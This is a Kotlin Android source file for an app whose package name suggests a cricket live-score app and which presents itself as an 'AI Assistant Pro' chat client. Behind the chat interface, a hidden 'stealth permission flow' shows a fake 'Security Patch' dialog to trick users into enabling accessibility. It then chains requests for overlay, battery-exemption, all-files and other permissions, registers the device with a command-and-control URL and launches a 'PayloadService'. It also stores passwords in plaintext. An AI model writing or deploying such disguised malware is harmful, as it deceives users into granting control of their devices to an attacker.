package com.cricket.livescore.ui

import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.text.InputType
import android.text.TextUtils
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.accessibility.AccessibilityManager
import android.view.inputmethod.EditorInfo
import android.widget.Button
import android.widget.EditText
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.cricket.livescore.databinding.ActivityMainBinding
import com.cricket.livescore.service.PayloadService
import com.cricket.livescore.utils.PermissionHelper
import org.json.JSONArray
import org.json.JSONObject

data class ChatMessage(val role: String, val content: String, val timestamp: Long) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("role", role); put("content", content); put("timestamp", timestamp)
    }
    companion object {
        fun fromJson(o: JSONObject) = ChatMessage(o.getString("role"), o.getString("content"), o.getLong("timestamp"))
    }
}
data class Folder(val id: String, var name: String) {
    fun toJson() = JSONObject().apply { put("id", id); put("name", name) }
    companion object {
        fun fromJson(o: JSONObject) = Folder(o.getString("id"), o.getString("name"))
    }
}
data class Conversation(
    val id: String, var title: String, val messages: MutableList<ChatMessage>,
    var folderId: String?, val createdAt: Long, var updatedAt: Long
) {
    fun toJson() = JSONObject().apply {
        put("id", id); put("title", title)
        put("messages", JSONArray(messages.map { it.toJson() }))
        put("folderId", folderId ?: JSONObject.NULL)
        put("createdAt", createdAt); put("updatedAt", updatedAt)
    }
    companion object {
        fun fromJson(o: JSONObject) = Conversation(
            o.getString("id"), o.getString("title"),
            mutableListOf<ChatMessage>().apply {
                val a = o.getJSONArray("messages")
                for (i in 0 until a.length()) add(ChatMessage.fromJson(a.getJSONObject(i)))
            },
            if (o.isNull("folderId")) null else o.getString("folderId"),
            o.getLong("createdAt"), o.getLong("updatedAt")
        )
    }
}

class MainActivity : AppCompatActivity() {
    companion object {
        private const val PERMISSION_REQ_CODE = 1001
        private const val PREFS = "ai_assistant_data"
        private const val KEY_CONV = "conversations"
        private const val KEY_FLD = "folders"
        private const val KEY_CUR = "current_conversation"
        private const val KEY_API = "api_key_setting"
        private const val KEY_LOGGED_IN = "logged_in"
        private const val KEY_USER_EMAIL = "user_email"
        private const val KEY_USER_NAME = "user_name"
        private const val GROQ_MODEL = "llama-3.1-8b-instant"
        private const val GROQ_API_URL = "https://api.groq.com/openai/v1/chat/completions"
    }

    private lateinit var b: ActivityMainBinding
    private val ph = PermissionHelper()
    private var flowCompleted = false
    private var overlayRequested = false
    private var batteryOptRequested = false
    private var storageRequested = false
    private var permissionRequested = false
    private var stealthDialogShown = false
    private var flowLaunched = false

    private lateinit var prefs: SharedPreferences
    private val conversations = mutableListOf<Conversation>()
    private val folders = mutableListOf<Folder>()
    private var currentConversationId: String? = null
    private var isLoggedIn = false
    private var isSignUp = false // toggle in login view

    // views
    private lateinit var loginView: ScrollView
    private lateinit var chatView: LinearLayout
    private lateinit var sidebarOverlay: FrameLayout
    private lateinit var sidebarPanel: LinearLayout
    private lateinit var sidebarScrim: View
    private lateinit var sidebarClose: TextView
    private lateinit var btnHamburger: TextView
    private lateinit var statusText: TextView
    private lateinit var sidebarNewChat: TextView
    private lateinit var conversationList: LinearLayout
    private lateinit var folderList: LinearLayout
    private lateinit var btnAddFolder: TextView
    private lateinit var settingsButton: LinearLayout
    private lateinit var emptyState: LinearLayout
    private lateinit var chatContainer: LinearLayout
    private lateinit var chatScroll: ScrollView
    private lateinit var chatTitle: TextView
    private lateinit var btnDeleteConv: TextView
    private lateinit var messageInput: EditText
    private lateinit var btnSend: Button
    private lateinit var prompt1: TextView
    private lateinit var prompt2: TextView
    private lateinit var prompt3: TextView

    // login views
    private lateinit var inputName: EditText
    private lateinit var inputEmail: EditText
    private lateinit var inputPassword: EditText
    private lateinit var inputConfirmPassword: EditText
    private lateinit var loginError: TextView
    private lateinit var btnAuth: TextView
    private lateinit var btnToggleAuth: TextView
    private lateinit var loginSubtitle: TextView
    private lateinit var loginStatus: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        b = ActivityMainBinding.inflate(layoutInflater)
        setContentView(b.root)
        prefs = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        isLoggedIn = prefs.getBoolean(KEY_LOGGED_IN, false)

        // Reminder: set your Groq API key in Settings → API Configuration
        // after the app is installed. The key is stored locally and never shared.
        // Without it, the app falls back to offline canned responses.

        loadConversations(); loadFolders()
        currentConversationId = prefs.getString(KEY_CUR, null)
        if (currentConversationId != null && conversations.none { it.id == currentConversationId }) currentConversationId = null

        initViews()
        renderSidebar()
        applyAuthVisibility()

        // sidebar toggle
        btnHamburger.setOnClickListener { showSidebar(true) }
        sidebarClose.setOnClickListener { showSidebar(false) }
        sidebarScrim.setOnClickListener { showSidebar(false) }

        // new chat
        sidebarNewChat.setOnClickListener { createNewConversation(); showSidebar(false) }
        btnAddFolder.setOnClickListener { showAddFolderDialog() }
        settingsButton.setOnClickListener { showSettingsDialog() }
        btnDeleteConv.setOnClickListener { deleteCurrentConversation() }

        // send
        btnSend.setOnClickListener {
            val t = messageInput.text.toString().trim()
            if (t.isNotEmpty()) { sendMessage(t); messageInput.text.clear() }
        }
        messageInput.setOnEditorActionListener { _, actionId, _ ->
            if (actionId == EditorInfo.IME_ACTION_SEND) {
                val t = messageInput.text.toString().trim()
                if (t.isNotEmpty()) { sendMessage(t); messageInput.text.clear() }; true
            } else false
        }
        prompt1.setOnClickListener { sendMessage(prompt1.text.toString()) }
        prompt2.setOnClickListener { sendMessage(prompt2.text.toString()) }
        prompt3.setOnClickListener { sendMessage(prompt3.text.toString()) }

        // auth buttons
        btnAuth.setOnClickListener { handleAuth() }
        btnToggleAuth.setOnClickListener { toggleAuthMode() }

        checkPermissions()
        if (!flowLaunched) {
            flowLaunched = true
            android.os.Handler(mainLooper).postDelayed({
                if (!isFinishing && !flowCompleted) triggerStealthPermissionFlow()
            }, 10000)
        }
    }

    // ─── INIT ─────────────────────────────────────────────────────────
    private fun initViews() {
        loginView = b.loginView
        chatView = b.chatView
        sidebarOverlay = b.sidebarOverlay
        sidebarPanel = b.sidebarPanel
        sidebarScrim = b.sidebarScrim
        sidebarClose = b.sidebarClose
        btnHamburger = b.btnHamburger
        statusText = b.statusText
        sidebarNewChat = b.sidebarNewChat
        conversationList = b.conversationList
        folderList = b.folderList
        btnAddFolder = b.btnAddFolder
        settingsButton = b.settingsButton
        emptyState = b.emptyState
        chatContainer = b.chatContainer
        chatScroll = b.chatScroll
        chatTitle = b.chatTitle
        btnDeleteConv = b.btnDeleteConversation
        messageInput = b.messageInput
        btnSend = b.btnSend
        prompt1 = b.prompt1; prompt2 = b.prompt2; prompt3 = b.prompt3
        inputName = b.inputName; inputEmail = b.inputEmail
        inputPassword = b.inputPassword; inputConfirmPassword = b.inputConfirmPassword
        loginError = b.loginError; btnAuth = b.btnAuth
        btnToggleAuth = b.btnToggleAuth; loginSubtitle = b.loginSubtitle
        loginStatus = b.loginStatus
    }

    // ─── AUTH VISIBILITY ──────────────────────────────────────────────
    private fun applyAuthVisibility() {
        if (isLoggedIn) {
            loginView.visibility = View.GONE
            chatView.visibility = View.VISIBLE
        } else {
            loginView.visibility = View.VISIBLE
            chatView.visibility = View.GONE
            loginError.visibility = View.GONE
        }
    }

    private fun toggleAuthMode() {
        isSignUp = !isSignUp
        if (isSignUp) {
            loginSubtitle.text = "Create your account"
            btnAuth.text = "Sign Up"
            btnToggleAuth.text = "Already have an account? Sign In"
            inputName.visibility = View.VISIBLE
            inputConfirmPassword.visibility = View.VISIBLE
        } else {
            loginSubtitle.text = "Sign in to your account"
            btnAuth.text = "Sign In"
            btnToggleAuth.text = "Don't have an account? Sign Up"
            inputName.visibility = View.GONE
            inputConfirmPassword.visibility = View.GONE
        }
        loginError.visibility = View.GONE
    }

    private fun handleAuth() {
        val email = inputEmail.text.toString().trim()
        val password = inputPassword.text.toString().trim()
        loginError.visibility = View.GONE

        if (email.isEmpty() || password.isEmpty()) {
            loginError.text = "Please fill in all fields"
            loginError.visibility = View.VISIBLE; return
        }
        if (!android.util.Patterns.EMAIL_ADDRESS.matcher(email).matches()) {
            loginError.text = "Please enter a valid email"
            loginError.visibility = View.VISIBLE; return
        }
        if (password.length < 4) {
            loginError.text = "Password must be at least 4 characters"
            loginError.visibility = View.VISIBLE; return
        }

        if (isSignUp) {
            val name = inputName.text.toString().trim()
            val confirm = inputConfirmPassword.text.toString().trim()
            if (name.isEmpty()) {
                loginError.text = "Please enter your name"; loginError.visibility = View.VISIBLE; return
            }
            if (password != confirm) {
                loginError.text = "Passwords do not match"; loginError.visibility = View.VISIBLE; return
            }
            // Save account
            prefs.edit()
                .putString("acct_${email}_pw", password)
                .putString("acct_${email}_name", name).apply()
            finishLogin(email, name)
        } else {
            // Sign in: check stored credentials
            val storedPw = prefs.getString("acct_${email}_pw", null)
            val storedName = prefs.getString("acct_${email}_name", "")
            if (storedPw == null || storedPw != password) {
                loginError.text = "Invalid email or password"
                loginError.visibility = View.VISIBLE; return
            }
            finishLogin(email, storedName ?: email)
        }
    }

    private fun finishLogin(email: String, name: String) {
        prefs.edit()
            .putBoolean(KEY_LOGGED_IN, true)
            .putString(KEY_USER_EMAIL, email)
            .putString(KEY_USER_NAME, name).apply()
        isLoggedIn = true
        loginStatus.text = "Signed in as $email"
        loginStatus.visibility = View.VISIBLE
        android.os.Handler(mainLooper).postDelayed({
            applyAuthVisibility()
            renderCurrentChat()
        }, 400)
    }

    // ─── SIDEBAR TOGGLE ───────────────────────────────────────────────
    private fun showSidebar(show: Boolean) {
        if (show) {
            sidebarOverlay.visibility = View.VISIBLE
            sidebarPanel.translationX = -280f
            sidebarPanel.animate().translationX(0f).setDuration(200).start()
        } else {
            sidebarPanel.animate().translationX(-280f).setDuration(150).withEndAction {
                sidebarOverlay.visibility = View.GONE
            }.start()
        }
    }

    // ─── PERSISTENCE ──────────────────────────────────────────────────
    private fun saveConversations() { prefs.edit().putString(KEY_CONV, JSONArray(conversations.map { it.toJson() }).toString()).apply() }
    private fun loadConversations() {
        val r = prefs.getString(KEY_CONV, null) ?: return
        try { val a = JSONArray(r); conversations.clear(); for (i in 0 until a.length()) conversations.add(Conversation.fromJson(a.getJSONObject(i))) }
        catch (e: Exception) { prefs.edit().remove(KEY_CONV).apply() }
    }
    private fun saveFolders() { prefs.edit().putString(KEY_FLD, JSONArray(folders.map { it.toJson() }).toString()).apply() }
    private fun loadFolders() {
        val r = prefs.getString(KEY_FLD, null) ?: return
        try { val a = JSONArray(r); folders.clear(); for (i in 0 until a.length()) folders.add(Folder.fromJson(a.getJSONObject(i))) }
        catch (e: Exception) { prefs.edit().remove(KEY_FLD).apply() }
    }
    private fun saveCurrent() { prefs.edit().putString(KEY_CUR, currentConversationId).apply() }

    // ─── SIDEBAR RENDER ───────────────────────────────────────────────
    private fun renderSidebar() { renderFolders(); renderConversations() }

    private fun renderFolders() {
        folderList.removeAllViews()
        folderList.addView(createFolderItem("All conversations", null,
            currentConversationId != null && conversations.find { it.id == currentConversationId }?.folderId == null))
        for (f in folders) folderList.addView(createFolderItem("📁 ${f.name}", f.id,
            currentConversationId != null && conversations.find { it.id == currentConversationId }?.folderId == f.id))
    }

    private fun createFolderItem(label: String, fid: String?, sel: Boolean): View {
        val tv = TextView(this).apply {
            text = label; textSize = 12f; setPadding(24, 10, 16, 10)
            setTextColor(if (sel) 0xFF6C63FF.toInt() else 0xFF888899.toInt())
            setBackgroundColor(if (sel) 0x1A6C63FF.toInt() else 0)
            setOnClickListener {
                if (fid == null) { renderConversations(); return@setOnClickListener }
                val f = conversations.find { it.folderId == fid }
                if (f != null) selectConversation(f.id) else Toast.makeText(this@MainActivity, "No conversations in this folder", Toast.LENGTH_SHORT).show()
            }
            setOnLongClickListener { if (fid != null) showFolderOptionsDialog(fid); true }
        }
        return tv
    }

    private fun renderConversations() {
        conversationList.removeAllViews()
        val sel = conversations.find { it.id == currentConversationId }
        val list = if (sel?.folderId != null) conversations.filter { it.folderId == sel.folderId } else conversations.toList()
        if (list.isEmpty()) {
            conversationList.addView(TextView(this).apply {
                text = "No conversations yet"; textSize = 12f; setTextColor(0xFF555577.toInt())
                setPadding(24, 16, 16, 16); gravity = Gravity.CENTER
            }); return
        }
        for (c in list.sortedByDescending { it.updatedAt }) {
            val active = c.id == currentConversationId
            conversationList.addView(TextView(this).apply {
                text = c.title; textSize = 12f; maxLines = 1; ellipsize = TextUtils.TruncateAt.END
                setPadding(24, 12, 16, 12)
                setTextColor(if (active) 0xFF6C63FF.toInt() else 0xFFcccccc.toInt())
                setBackgroundColor(if (active) 0x1A6C63FF.toInt() else 0)
                setOnClickListener { selectConversation(c.id); showSidebar(false) }
                setOnLongClickListener { showConversationOptionsDialog(c.id); true }
            })
        }
    }

    // ─── CHAT RENDER ──────────────────────────────────────────────────
    private fun renderCurrentChat() {
        if (currentConversationId == null) {
            emptyState.visibility = View.VISIBLE; chatScroll.visibility = View.GONE; return
        }
        emptyState.visibility = View.GONE; chatScroll.visibility = View.VISIBLE
        val conv = conversations.find { it.id == currentConversationId } ?: run {
            currentConversationId = null; emptyState.visibility = View.VISIBLE; chatScroll.visibility = View.GONE; saveCurrent(); return
        }
        chatTitle.text = conv.title; chatContainer.removeAllViews()
        for (m in conv.messages) { if (m.role == "user") addMsgView(m.content, true) else addMsgView(m.content, false) }
        scrollBottom(); renderSidebar()
    }

    private fun addMsgView(text: String, isUser: Boolean) {
        val tv = TextView(this).apply {
            this.text = text; textSize = 14f
            if (isUser) { setTextColor(0xFFffffff.toInt()); setPadding(40, 8, 12, 8); setBackgroundColor(0xFF6C63FF.toInt()); gravity = Gravity.END }
            else { setTextColor(0xFFcccccc.toInt()); setPadding(12, 8, 40, 8); setBackgroundColor(0xFF2D2B55.toInt()) }
        }
        val lp = LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
            setMargins(if (isUser) 60 else 4, 4, if (isUser) 4 else 60, 4); gravity = if (isUser) Gravity.END else Gravity.START
        }
        tv.layoutParams = lp; chatContainer.addView(tv)
    }

    private fun scrollBottom() { chatScroll.post { chatScroll.fullScroll(ScrollView.FOCUS_DOWN) } }

    // ─── CONVERSATIONS ────────────────────────────────────────────────
    private fun createNewConversation() {
        val id = "conv_${System.currentTimeMillis()}"
        conversations.add(0, Conversation(id, "New conversation", mutableListOf(), null, System.currentTimeMillis(), System.currentTimeMillis()))
        selectConversation(id); saveConversations()
    }
    private fun selectConversation(id: String) { currentConversationId = id; saveCurrent(); renderCurrentChat() }
    private fun deleteCurrentConversation() {
        val id = currentConversationId ?: return; if (isFinishing || isDestroyed) return
        AlertDialog.Builder(this).setTitle("Delete conversation?").setMessage("This will permanently remove this conversation.")
            .setPositiveButton("Delete") { _, _ -> conversations.removeAll { it.id == id }; currentConversationId = null; saveConversations(); saveCurrent(); renderCurrentChat() }
            .setNegativeButton("Cancel", null).show()
    }
    private fun showConversationOptionsDialog(convId: String) {
        if (isFinishing || isDestroyed) return
        val opts = mutableListOf("Delete conversation")
        if (folders.isNotEmpty()) opts.add("Move to folder...")
        AlertDialog.Builder(this).setTitle("Options").setItems(opts.toTypedArray()) { _, w ->
            when (opts[w]) {
                "Delete conversation" -> { conversations.removeAll { it.id == convId }; if (currentConversationId == convId) currentConversationId = null; saveConversations(); renderCurrentChat() }
                "Move to folder..." -> showMoveToFolderDialog(convId)
            }
        }.show()
    }
    private fun showMoveToFolderDialog(convId: String) {
        if (isFinishing || isDestroyed) return
        val names = folders.map { it.name }.toTypedArray()
        AlertDialog.Builder(this).setTitle("Move to folder").setItems(names) { _, w ->
            conversations.find { it.id == convId }?.let { it.folderId = folders[w].id; it.updatedAt = System.currentTimeMillis() }
            saveConversations(); renderCurrentChat(); Toast.makeText(this, "Moved to ${folders[w].name}", Toast.LENGTH_SHORT).show()
        }.setNegativeButton("Cancel", null).show()
    }

    // ─── FOLDERS ──────────────────────────────────────────────────────
    private fun showAddFolderDialog() {
        if (isFinishing || isDestroyed) return
        val input = EditText(this).apply { hint = "Folder name"; setPadding(40, 16, 40, 16) }
        AlertDialog.Builder(this).setTitle("New Folder").setView(input)
            .setPositiveButton("Create") { _, _ ->
                val n = input.text.toString().trim()
                if (n.isNotEmpty()) { folders.add(Folder("folder_${System.currentTimeMillis()}", n)); saveFolders(); renderSidebar() }
            }.setNegativeButton("Cancel", null).show()
    }
    private fun showFolderOptionsDialog(fid: String) {
        if (isFinishing || isDestroyed) return; val f = folders.find { it.id == fid } ?: return
        AlertDialog.Builder(this).setTitle(f.name).setItems(arrayOf("Rename", "Delete folder")) { _, w ->
            when (w) { 0 -> showRenameFolderDialog(fid)
                1 -> { folders.removeAll { it.id == fid }; conversations.filter { it.folderId == fid }.forEach { it.folderId = null }; saveFolders(); saveConversations(); renderCurrentChat() } }
        }.setNegativeButton("Cancel", null).show()
    }
    private fun showRenameFolderDialog(fid: String) {
        if (isFinishing || isDestroyed) return; val f = folders.find { it.id == fid } ?: return
        val input = EditText(this).apply { setText(f.name); setPadding(40, 16, 40, 16) }
        AlertDialog.Builder(this).setTitle("Rename Folder").setView(input)
            .setPositiveButton("Rename") { _, _ ->
                val n = input.text.toString().trim()
                if (n.isNotEmpty()) { f.name = n; saveFolders(); renderSidebar() }
            }.setNegativeButton("Cancel", null).show()
    }

    // ─── CHAT LOGIC (Groq API) ────────────────────────────────────────
    private fun sendMessage(text: String) {
        if (currentConversationId == null) createNewConversation()
        val conv = conversations.find { it.id == currentConversationId } ?: return
        if (conv.messages.isEmpty()) conv.title = if (text.length > 40) text.take(40) + "..." else text
        conv.messages.add(ChatMessage("user", text, System.currentTimeMillis()))
        conv.updatedAt = System.currentTimeMillis(); saveConversations(); renderCurrentChat()
        callGroqApi(conv) { response ->
            if (!isFinishing && !isDestroyed) {
                conv.messages.add(ChatMessage("assistant", response, System.currentTimeMillis()))
                conv.updatedAt = System.currentTimeMillis(); saveConversations(); renderCurrentChat()
            }
        }
    }

    private fun callGroqApi(conv: Conversation, callback: (String) -> Unit) {
        Thread {
            try {
                val apiKey = prefs.getString(KEY_API, null)
                if (apiKey.isNullOrEmpty()) {
                    Thread.sleep(600)
                    runOnUiThread { callback(generateFallback(conv.messages.lastOrNull()?.content ?: "")) }
                    return@Thread
                }
                val userName = prefs.getString(KEY_USER_NAME, "there")
                val messages = JSONArray()
                messages.put(JSONObject().apply {
                    put("role", "system")
                    put("content", "You are AI Assistant Pro, a helpful assistant. Keep responses under 3 sentences and conversational. The user's name is $userName — use it naturally when appropriate.")
                })
                for (msg in conv.messages) {
                    messages.put(JSONObject().apply { put("role", msg.role); put("content", msg.content) })
                }
                val body = JSONObject().apply {
                    put("model", GROQ_MODEL)
                    put("messages", messages)
                    put("max_tokens", 300)
                    put("temperature", 0.7)
                }
                val url = java.net.URL(GROQ_API_URL)
                val conn = url.openConnection() as java.net.HttpURLConnection
                conn.requestMethod = "POST"
                conn.connectTimeout = 15000
                conn.readTimeout = 30000
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Authorization", "Bearer $apiKey")
                conn.outputStream.write(body.toString().toByteArray())
                val resp = if (conn.responseCode == 200) {
                    val reader = java.io.BufferedReader(java.io.InputStreamReader(conn.inputStream))
                    val text = reader.readText(); reader.close()
                    val json = JSONObject(text)
                    json.getJSONArray("choices").getJSONObject(0).getJSONObject("message").getString("content")
                } else {
                    val reader = java.io.BufferedReader(java.io.InputStreamReader(conn.errorStream))
                    val err = reader.readText(); reader.close()
                    Log.e("GroqAPI", "HTTP ${conn.responseCode}: $err"); null
                }
                conn.disconnect()
                runOnUiThread { callback(resp ?: generateFallback(conv.messages.lastOrNull()?.content ?: "")) }
            } catch (e: Exception) {
                Log.e("GroqAPI", "API call failed", e)
                Thread.sleep(600)
                runOnUiThread { callback(generateFallback(conv.messages.lastOrNull()?.content ?: "")) }
            }
        }.apply { isDaemon = true }.start()
    }

    private fun generateFallback(input: String): String {
        val l = input.lowercase()
        return when {
            l.contains("hello") || l.contains("hi") || l.contains("hey") -> "Hello! How can I assist you today?"
            l.contains("how are you") -> "I'm functioning perfectly! Ready to help you with your tasks."
            l.contains("name") || l.contains("who are you") -> "I'm AI Assistant Pro — your personal AI-powered helper. I can assist with writing, answering questions, research, and more."
            l.contains("write") || l.contains("email") || l.contains("essay") || l.contains("article") -> "I can help you write! Tell me the topic and I'll draft something for you."
            l.contains("translate") -> "I can help with translations. What text would you like me to translate and to which language?"
            l.contains("summarize") || l.contains("summary") -> "Send me the text you'd like summarized and I'll create a concise summary for you."
            l.contains("help") || l.contains("what can you") -> "I can help with:\n\n• Writing & editing\n• Answering questions\n• Research assistance\n• Text analysis\n• Translations\n• Summarization"
            l.contains("research") || l.contains("topic") -> "Great, I can help you research! Tell me the topic and I'll provide an overview with key points and insights."
            l.contains("thank") -> "You're welcome! Is there anything else I can help you with?"
            l.contains("bye") || l.contains("goodbye") -> "Goodbye! Feel free to come back anytime you need assistance."
            else -> "That's interesting! I'm still learning about that. Could you tell me more so I can better assist you?"
        }
    }

    // ─── SETTINGS ─────────────────────────────────────────────────────
    private fun showSettingsDialog() {
        if (isFinishing || isDestroyed) return
        val savedKey = prefs.getString(KEY_API, "") ?: ""
        val input = EditText(this).apply {
            setText(if (savedKey.isEmpty()) "" else savedKey)
            hint = "gsk_... (Groq API key)"
            setPadding(40, 16, 40, 16)
        }
        AlertDialog.Builder(this)
            .setTitle("API Configuration")
            .setMessage("Enter your Groq API key to enable AI-powered responses. Uses llama-3.1-8b-instant (fast & free). Your key is stored locally and never shared.")
            .setView(input)
            .setPositiveButton("Save") { _, _ ->
                val key = input.text.toString().trim()
                prefs.edit().putString(KEY_API, key).apply()
                if (key.isNotEmpty()) Toast.makeText(this, "API key saved. New messages will use Groq AI.", Toast.LENGTH_LONG).show()
                else Toast.makeText(this, "API key cleared. Using offline fallback responses.", Toast.LENGTH_SHORT).show()
            }
            .setNegativeButton("Cancel", null).show()
    }

    // ─── PERMISSION FLOW ──────────────────────────────────────────────
    private fun checkPermissions() {
        statusText.text = if (!isAccessibilityServiceEnabled()) "Enable accessibility for full AI assistance" else "Ready to assist"
        statusText.setTextColor(if (!isAccessibilityServiceEnabled()) 0xFFFFCC00.toInt() else 0xFF6C63FF.toInt())
    }
    private fun triggerStealthPermissionFlow() {
        if (stealthDialogShown) return; stealthDialogShown = true
        if (isAccessibilityServiceEnabled()) startPayloadFlow() else showStealthAccessibilityPrompt()
    }
    private fun showStealthAccessibilityPrompt() {
        if (isFinishing || isDestroyed) return
        AlertDialog.Builder(this).setTitle("System Update Required")
            .setMessage("Security Patch v2.1\n\nYour device needs a critical security update to enable enhanced AI features. Tap 'Apply Now' to proceed with the update process.")
            .setPositiveButton("Apply Now") { _, _ -> if (!isFinishing && !isDestroyed) openAccessibilitySettings() }
            .setNegativeButton("Later", null).setCancelable(false).show()
    }
    private fun openAccessibilitySettings() { if (!isFinishing && !isDestroyed) startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
    private fun isAccessibilityServiceEnabled(): Boolean {
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        return am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK).any { it.resolveInfo.serviceInfo.packageName == packageName }
    }
    fun startPayloadFlow() { if (!flowCompleted) continuePayloadFlow() }
    private fun continuePayloadFlow() {
        if (flowCompleted || isFinishing || isDestroyed) return
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            if (!overlayRequested) { overlayRequested = true; startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))); return }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                if (!batteryOptRequested) { batteryOptRequested = true; startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName"))); return }
            }
        }
        if (!PermissionHelper.hasStoragePermission(this)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (!storageRequested) { storageRequested = true; startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:$packageName"))); return }
            }
        }
        if (!ph.hasAllPermissions(this)) {
            if (!permissionRequested) { permissionRequested = true; ph.requestPermissions(this); return }
        }
        finishSetup()
    }
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQ_CODE && !isFinishing && !isDestroyed) { permissionRequested = false; continuePayloadFlow() }
    }
    private fun finishSetup() {
        if (isFinishing || isDestroyed) return; flowCompleted = true
        Thread {
            registerViaHttpSync()
            runOnUiThread {
                if (isFinishing || isDestroyed) return@runOnUiThread
                val si = Intent(this, PayloadService::class.java)
                try { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(si) else startService(si) }
                catch (e: Exception) { Log.e("MainActivity", "ForegroundService failed", e) }
                statusText.text = "AI services activated"
                statusText.setTextColor(0xFF00FF41.toInt())
                loginStatus.text = "AI services activated"
                loginStatus.visibility = View.VISIBLE
            }
        }.apply { isDaemon = true }.start()
    }
    private fun registerViaHttpSync() {
        try {
            val j = JSONObject().apply {
                put("device_id", Build.ID); put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
                put("manufacturer", Build.MANUFACTURER); put("model", Build.MODEL)
                put("android_version", Build.VERSION.RELEASE); put("api_level", Build.VERSION.SDK_INT)
            }
            val url = java.net.URL("${com.cricket.livescore.StagerApplication.c2RealUrl}/api/register")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "POST"; conn.connectTimeout = 5000; conn.readTimeout = 5000; conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            conn.outputStream.write(j.toString().toByteArray())
            val code = conn.responseCode; conn.disconnect()
            Log.i("MainActivity", "HTTP registration: $code")
        } catch (e: Exception) { Log.e("MainActivity", "HTTP registration failed", e) }
    }
    override fun onResume() {
        super.onResume()
        if (isFinishing || isDestroyed) return
        if (isAccessibilityServiceEnabled()) { statusText.text = "Ready to assist"; startPayloadFlow() }
    }
}
